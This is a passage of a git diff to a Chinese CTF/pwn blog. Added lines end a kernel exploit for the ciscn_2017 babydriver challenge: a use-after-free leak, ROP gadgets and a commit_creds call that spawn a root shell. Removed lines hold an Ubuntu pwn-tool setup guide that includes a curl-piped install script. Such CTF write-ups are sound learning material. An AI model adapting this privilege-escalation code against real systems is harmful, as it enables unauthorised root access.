class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff81e48c60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveReg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>         seq_fd;</span><br><span class="line"><span class="keyword">size_t</span>      pop_rdi_ret;</span><br><span class="line"><span class="keyword">size_t</span>      init_cred;</span><br><span class="line"><span class="keyword">size_t</span>      swapgs;</span><br><span class="line"><span class="keyword">size_t</span>      add_rsp_offset_ret;</span><br><span class="line"><span class="keyword">size_t</span>      magic_addr;</span><br><span class="line"><span class="keyword">size_t</span>      mov_cr4_ret;</span><br><span class="line"><span class="keyword">size_t</span>      swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>         fd[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">size_t</span>      leak_data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    saveReg();</span><br><span class="line"></span><br><span class="line">    fd[<span class="number">0</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    fd[<span class="number">1</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(fd[<span class="number">0</span>], <span class="number">0x10001</span>, <span class="number">0x20</span>);</span><br><span class="line">    close(fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    read(fd[<span class="number">1</span>], leak_data, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data dump %d: %p\n&quot;</span>, i, leak_data[i]);</span><br><span class="line"></span><br><span class="line">    kernel_offset = leak_data[<span class="number">0</span>] - <span class="number">0xffffffff8122f4d0</span>;</span><br><span class="line">    kernel_base = (<span class="keyword">void</span>*) ((<span class="keyword">size_t</span>)kernel_base + kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel offset: %llx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0xffffffff810d238d</span> + kernel_offset; <span class="comment">/* pop rdi; ret; */</span></span><br><span class="line">    swapgs = <span class="number">0xffffffff81063694</span> + kernel_offset; <span class="comment">/* swapgs; pop rbp; ret; */</span></span><br><span class="line">    mov_cr4_ret = <span class="number">0xffffffff81004d80</span> + kernel_offset; <span class="comment">/* mov cr4, rdi; pop rbp; ret; */</span></span><br><span class="line"></span><br><span class="line">    magic_addr = kernel_offset + <span class="number">0xffffffff810d238d</span>; <span class="comment">/* 为了打断点而随便找的 */</span></span><br><span class="line">    add_rsp_offset_ret = kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic_addr: 0x%llx\n&quot;</span>, magic_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    write(fd[<span class="number">1</span>], &amp;magic_addr, <span class="number">8</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, add_rsp_offset_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, commit_creds;&quot;</span> </span><br><span class="line">        <span class="string">&quot;mov r12, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    getRootShell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<p><strong>小结：</strong></p>
+<p>主要是参考 <a target="_blank" rel="noopener" href="https://www.anquanke.com/member.html?memberId=157910">墨晚鸢</a> 大佬的博客：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266897#h3-2">在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs 通用内核ROP解法-安全客 - 安全资讯平台 (anquanke.com)</a> </li>
+</ul>
+<p>他给出的参考题目应该是改过内核版本的，我手上没有对应版本的题目，最后只能将就了</p>
+<p>之后抽时间学一下 <code>ldt_struct</code> 的利用</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1866,295 +2056,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">ubuntu环境搭建</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-12-15 16:08:44 / Modified: 16:11:23" itemprop="dateCreated datePublished" datetime="2022-12-15T16:08:44+08:00">2022-12-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>6.6k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>6 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>前置工作</strong></p>
-<p>下载 VMware：<a target="_blank" rel="noopener" href="https://www.vmware.com/cn.html">VMware 中国 - 交付面向企业的数字化基础 | CN</a> </p>
-<p>下载对应的 Ubuntu 镜像：<a target="_blank" rel="noopener" href="http://mirrors.ustc.edu.cn/ubuntu-releases/">Index of /ubuntu-releases/ (ustc.edu.cn)</a> </p>
-<p><strong>安装 Ubuntu</strong></p>
-<p>选择新建虚拟机：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007078806.png" class width="1671007078806"> 
-<p>选择稍后安装：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007104568.png" class width="1671007104568"> 
-<p>在“虚拟机设置”中选择“CD/DVD”，然后指定 ISO 镜像文件的位置：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007295735.png" class width="1671007295735"> 
-<p>启动虚拟机开始安装</p>
-<p>左侧滑到最下面，然后选择“中文”，接着点击“安装Ubuntu”：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007747912.png" class width="1671007747912"> 
-<p>接下来的操作有点“炒蛋”，由于窗口空间有限，我们要利用方向键来选择“下一步”：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671007837090.png" class width="1671007837090"> 
-<p>耐心等待程序安装完毕：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671008237681.png" class width="1671008237681"> 
-<ul>
-<li>如果嫌慢可以直接 Skip</li>
-</ul>
-<p><strong>安装 VMwareTools</strong></p>
-<p>右键选择“重新安装”：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671010865246.png" class width="1671010865246"> 
-<p>选择左侧的 DVD，把压缩包解压：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671011046581.png" class width="1671011046581"> 
-<p>执行命令 <code>sudo ./vmware-install.pl</code>，如果遇到 [NO] 要选择 [YES]</p>
-<p>如果无法实现[主机/虚拟机]复制粘贴，就执行如下命令来安装 open-vm-tools：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools-desktop fuse</span><br></pre></td></tr></table></figure>
-<p><strong>设置共享文件夹</strong></p>
-<p>在“虚拟机设置”中选择“共享文件夹”</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671011301541.png" class width="1671011301541"> 
-<p>选择“总是启用”后点击添加：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671011373563.png" class width="1671011373563"> 
-<p>选择需要主机上需要共享的文件夹</p>
-<p>然后在 <code>/mnt/hgfs</code> 目录下就有我们的共享目录了</p>
-<p><strong>安装 Oh My Zsh 美化终端</strong></p>
-<p>安装 Zsh：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zsh</span><br></pre></td></tr></table></figure>
-<ul>
-<li>将 Zsh 设置为默认 shell</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
-<p>安装 Oh My Zsh：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)&quot;</span></span><br></pre></td></tr></table></figure>
-<p>安装插件：</p>
-<ul>
-<li>zsh-autosuggestions（代码补全）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
-<ul>
-<li>zsh-syntax-highlighting（颜色标记）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
-<ul>
-<li>使用 <code>gedit ~/.zshrc</code> 命令进行进行配置（修改 <code>plugins</code>）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">    git</span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<p><strong>安装 Clash for Linux 实现科学上网</strong></p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/Fndroid/clash_for_windows_pkg/releases">Releases · Fndroid/clash_for_windows_pkg (github.com)</a>  </p>
-<ul>
-<li>下载 <code>Clash.for.Windows-0.17.3-x64-linux.tar.gz</code></li>
-</ul>
-<p>解压后执行 <code>./cfw</code>：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671016277529.png" class width="1671016277529"> 
-<ul>
-<li>需要购买并配置机场</li>
-</ul>
-<p>设置网络代理：</p>
-<img src="/2022/12/15/ubuntu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1671025133872.png" class width="1671025133872"> 
-<p>为终端配置代理：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy https://127.0.0.1:7890</span><br><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure>
-<p><strong>Ubuntu 换源</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
-<ul>
-<li>更换阿里源：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
-<ul>
-<li>保存后更新</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
-<p><strong>安装 Python 环境</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python2</span><br><span class="line">sudo apt install python3</span><br><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure>
-<p>由于 Ubuntu 官方源已经不支持 pip2 的安装，于是我们只能手动安装 pip2：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure>
-<p>pip 换源：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-<p><strong>安装各种 pwn 工具</strong></p>
-<ul>
-<li>pwntools（核心）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pwntools</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
-<ul>
-<li>patchelf（换 libc 版本）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-<ul>
-<li>glibc-all-in-one（下载 libc 版本）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https://github.com/matrix1001/glibc-all-in-one.git </span><br><span class="line">cd glibc-all-in-one/</span><br><span class="line">python update_list</span><br></pre></td></tr></table></figure>
-<ul>
-<li>ROPgadget（找 gadget）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
-<ul>
-<li>ropper（找 gadget）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure>
-<ul>
-<li>seccomp_tools（检测沙盒）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
-<ul>
-<li>one_gadget（找 one_gadget）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
-<p><strong>安装调试工具</strong></p>
-<ul>
-<li>GDB</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb</span><br></pre></td></tr></table></figure>
-<ul>
-<li>pwngdb</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp ./Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure>
-<ul>
-<li>pwndbg</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
-<p>pwngdb+pwndbg 文件配置：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.gdbinit</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">source</span> ~/Tools/peda/peda.py</span></span><br><span class="line">source ~/Tools/pwndbg/gdbinit.py </span><br><span class="line">source ~/Tools/Pwngdb/pwngdb.py</span><br><span class="line">source ~/Tools/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
-<p><strong>下载与更换 gcc 版本</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install g++-5</span><br><span class="line">sudo apt install gcc-5</span><br><span class="line">sudo apt install g++-7</span><br><span class="line">sudo apt install gcc-7</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  Tools ls  /usr/bin | grep g++</span><br><span class="line">g++</span><br><span class="line">g++<span class="number">-5</span></span><br><span class="line">g++<span class="number">-7</span></span><br><span class="line">g++<span class="number">-9</span></span><br><span class="line">x86_64-linux-gnu-g++</span><br><span class="line">x86_64-linux-gnu-g++<span class="number">-5</span></span><br><span class="line">x86_64-linux-gnu-g++<span class="number">-7</span></span><br><span class="line">x86_64-linux-gnu-g++<span class="number">-9</span></span><br></pre></td></tr></table></figure>
-<p>使用以下命令生成链接组：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50 --slave /usr/bin/g++ g++ /usr/bin/g++-5</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 50 --slave /usr/bin/g++ g++ /usr/bin/g++-7</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 50 --slave /usr/bin/g++ g++ /usr/bin/g++-9</span><br></pre></td></tr></table></figure>
-<p>使用如下命令更换 gcc：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config gcc</span><br></pre></td></tr></table></figure>
-<p>效果如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">有 <span class="number">3</span> 个候选项可用于替换 gcc (提供 /usr/bin/gcc)。</span><br><span class="line"></span><br><span class="line">  选择       路径          优先级  状态</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">* <span class="number">0</span>            /usr/bin/gcc<span class="number">-5</span>   <span class="number">50</span>        自动模式</span><br><span class="line">  <span class="number">1</span>            /usr/bin/gcc<span class="number">-5</span>   <span class="number">50</span>        手动模式</span><br><span class="line">  <span class="number">2</span>            /usr/bin/gcc<span class="number">-7</span>   <span class="number">50</span>        手动模式</span><br><span class="line">  <span class="number">3</span>            /usr/bin/gcc<span class="number">-9</span>   <span class="number">50</span>        手动模式</span><br><span class="line"></span><br><span class="line">要维持当前值[*]请按&lt;回车键&gt;，或者键入选择的编号：</span><br></pre></td></tr></table></figure>
-<p><strong>安装 docker</strong></p>
-<p>docker：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable&quot;</span><br><span class="line">sudo apt update</span><br><span class="line">apt-cache policy docker-ce</span><br><span class="line">sudo apt install docker-ce</span><br></pre></td></tr></table></figure>
-<ul>
-<li>检测 docker 是否运行：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure>
-<ul>
-<li>docker 换源：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /etc/docker/daemon.json</span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
